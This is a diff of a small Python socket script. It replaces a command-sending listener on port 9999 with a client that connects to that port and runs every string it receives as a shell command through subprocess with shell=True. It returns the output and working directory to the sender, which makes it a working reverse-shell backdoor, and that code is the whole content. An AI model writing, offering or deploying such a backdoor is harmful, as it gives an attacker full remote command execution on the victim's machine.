@@ -1,50 +1,26 @@
 import socket
-import sys
+import os
+import subprocess
 
-def socket_create():
-    try:
-        global host
-        global port
-        global s
-        host = ""
-        port = 9999
-        s = socket.socket()
-    except socket.error as msg:
-        print("socket creation error: " + str(msg))
+s = socket.socket()
+nico = socket.gethostname()
+IPAddr = socket.gethostbyname(nico)
+print('your computer name is:' + nico)
+print('your computer IP address is:' + IPAddr)
+port = 9999
+s.connect((nico, port))
 
-def socket_bind():
-    try:
-        global host
-        global port
-        global s
-        print("Binding socket to port: " + str(port))
-        s.bind((host, port))
-        s.listen(5)
-    except socket.error as msg:
-        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
-        socket_bind()
 
-def socket_accept():
-    connection, address = s.accept()
-    print("connection has been established | " + "IP" + address[0] + "| Port " + str(address[1]))
-    send_commands(connection)
-    connection.close
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8")== 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes, 'utf-8')
+        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
+        print(output_str)
 
-def send_commands(connection):
-    while True:
-        cmd = input()
-        if cmd == 'quit':
-            connection.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            connection.send(str.encode(cmd))
-            client_response = str(connection.recv(1024), "utf-8")
-            print(client_response, end="")
-
-def main():
-    socket_create()
-    socket_bind()
-    socket_accept()
-
-main()
+#Close Connection
+s.close()
